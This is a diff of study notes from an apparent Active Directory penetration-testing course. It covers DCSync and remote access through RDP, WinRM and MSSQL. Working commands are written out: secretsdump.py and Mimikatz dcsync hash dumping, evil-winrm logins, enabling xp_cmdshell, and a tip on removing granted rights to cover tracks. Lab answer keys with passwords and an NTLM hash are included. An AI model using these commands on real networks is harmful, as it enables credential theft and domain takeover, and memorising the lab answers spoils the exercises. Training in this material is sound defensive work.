@@ -1652,3 +1652,176 @@ hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
 DCSync
 Based on our work in the previous section, we now have control over the user adunn who has DCSync privileges in the INLANEFREIGHT.LOCAL domain. Let's dig deeper into this attack and go through examples of leveraging it for full domain compromise from both a Linux and a Windows attack host.
 \\Scenario Setup
+
+What is DCSync and How Does it Work?
+-DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+-The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+-To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
+
+\\Viewing adunn's Replication privilege through ADSI Edit 
+-It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords. Here we have a standard domain user that has been granted the replicating permissions:
+
+\\Using Get-DomainUser to View adunn's Group Membership
+PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+-PowerView can be used to confirm that this standard user does indeed have the necessary permissions assigned to their account. We first get the user's SID in the above command and then check all ACLs set on the domain object ("DC=inlanefreight,DC=local") using Get-ObjectAcl to get the ACLs associated with the object. Here we search specifically for replication rights and check if our user adunn (denoted in the below command as $sid) possesses these rights. The command confirms that the user does indeed have the rights.
+
+\\Using Get-ObjectAcl to Check adunn's Replication Rights
+PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+-If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py. Let's see a few quick examples.
+-Running the tool as below will write all hashes to files with the prefix inlanefreight_hashes. The -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+
+\\Extracting NTLM Hashes and Kerveros Keys Using secretsdump.py
+$secretdump.py- outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+-We can use the -just-dc-ntlm flag if we only want NTLM hashes or specify -just-dc-user <USERNAME> to only extract data for a specific user.
+-options include -pwd-last-set to see when each account's password was last changed and -history if we want to dump password history
+-helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The -user-status is another helpful flag to check and see if a user is disabled
+We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:
+
+Number and % of passwords cracked
+top 10 passwords
+Password length metrics
+Password re-use
+
+If we check the files created using the -just-dc flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with reversible encryption enabled.
+
+\\Listing Hashes, kerberoast Keys, and Cleartext passwords
+$ls inlanefreight_hashes*
+-While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes
+\\Viewing an Account with Reversible Encryption Password Storage Set
+-ools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
+- If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the Get-ADUser cmdlet:
+\\Enumerating Further using Get-ADUser
+PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+-We can see that one account, proxyagent, has the reversible encryption option set with PowerView as well:
+
+\\Checking for Reversible Encryption Option using Get-DomainUser
+PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+We will notice the tool decrypted the password and provided us with the cleartext value.
+
+\\Displaying the Decrypted Password
+$cat inlanefreight_hashes.ntds.cleartext 
+-I have been on a few engagements where all user accounts were stored using reversible encryption. Some clients may do this to be able to dump NTDS and perform periodic password strength audits without having to resort to offline password cracking.
+-We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in administrator account. We could also target the krbtgt account and use this to create a Golden Ticket for persistence, but that is outside the scope of this module.
+-Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize runas.exe to accomplish this:
+
+\\Using runas.exe
+cmd>runas /netonly /user:INLANEFREIGHT\adunn powershell
+-From the newly spawned powershell session, we can perform the attack:
+
+\\Performing the Attack with Mimikatz
+ps>.\mimikatz.exe
+#mimikatz # privilege::debug 
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+ 
+<test>"Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer."
+xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
+cd C:\Tools\
+Import-Module .\PowerView.ps1
+Students then need to check for Reversible Encryption options assigned to users by using Get-DomainUser:
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+syncron.
+
+"What is this user's cleartext password?"
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+cd C:\Tools\mimikatz\x64\
+.\mimikatz.exe
+Students need to perform a DCSync attack using mimikatz:
+mimikatz# lsadump::dcsync /user:INLANEFREIGHT\syncron
+Mycleart3xtP@ss!.
+
+<test>"Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer."
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+cd C:\Tools\mimikatz\x64\
+.\mimikatz.exe
+lsadump::dcsync /user:INLANEFREIGHT\khartsfield
+4bb3b317845f0954200a6b0acc9b9f9a
+
+\\\\\\\\\\\\==========================
+Privileged Access
+-Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.
+-But what if we don't yet have local admin rights on any hosts in the domain?
++Remote Desktop Protocol (RDP) - is
++https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.5&viewFallbackFrom=powershell-7.2
++MSSQL Server:an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods
+-We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
+CanRDP
+CanPSRemote
+SQLAdmin
+-We can also enumerate these privileges using tools such as PowerView and even built-in tools.
+
+\\Scenario Setup
+\\Remote Desktop
+Launch further attacks
+We may be able to escalate privileges and obtain credentials for a higher privileged user
+We may be able to pillage the host for sensitive data or credentials
+-Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host. Let's check out the Remote Desktop Users group on the MS01 host in our target domain.
+
+\\Enumerating the Remote Desktop Users Group
+$PS>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+\\Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
+-If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.
+
+\\Checking Remote Access Rights using BloodHound
+We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RD
+-This can also be helpful for the blue team to periodically audit remote access rights across the environment and catch large-scale issues such as all Domain Users having unintended access to a host or audit rights for specific users/groups.
+
+\\WinRM
+use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8/Windows Server 2012 to enable WinRM access without granting local admin rights.
+
+\\Enumerating the Remote Management Users Group
+PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+-We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+\\Using the Cypher Query in BloodHound
+\\Adding the Cypher Query as a Custom Query in BloodHound
+We can use the Enter-PSSession cmdlet using PowerShell from a Windows host.
+
+\\Establishing WinRM Session from Windows
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+\\Installing Evil-WinRM
+$gem install evil-winrm
+\\Connecting to a Target With Evil-WinRM and Valid Credentials
+$evil-winrm -i 10.129.201.234 -u forend
+
+\\SQL Server Admin
+-may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.
+https://github.com/SnaffCon/Snaffler
+-BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+
+\\Using a Custom Cyper Query to Check for SQL admin rights in BloodHound
+https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
+
+\\Enumerating MSSQL Instance with PowerUpSQL
+PS>cd .\PowerUpSQL\
+PS>Import-Module .\PowerUpSQL.ps1
+PS>Get-SQLInstanceDomain
+-We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+\\Displaying mssqlclient.py Options
+$mssqlclient.py
+
+\\Running mssqlclient.py Against the Target
+$mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+Viewing our Options with Access to the SQL Server
+help
+Chossing enable_xp_cmdshell
+sql>enable_xp_cmdshell
+- SeImpersonatePrivilege, which can be leveraged in combination with a tool such as JuicyPotato, PrintSpoofer, or RoguePotato to escalate to SYSTEM level privileges,
+
+\\Enumerating our RIGHTs on the System using xp_cmdshell 
+xp_cmdshell whoami /privilege
+-Finally, whenever we find SQL credentials (in a script, a web.config file, or another type of database connection string), we should test access against any MSSQL servers in the environment. This type of access is almost guaranteed SYSTEM access over a host. If we can run commands as the account we authenticate with, it will almost always have the dangerous SeImpersonatePrivilege right.
+
+<test> What other user in the domain has CanPSRemote rights to a host?
+
+ What host can this user access via WinRM? (just the computer name)
+
+ Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt.
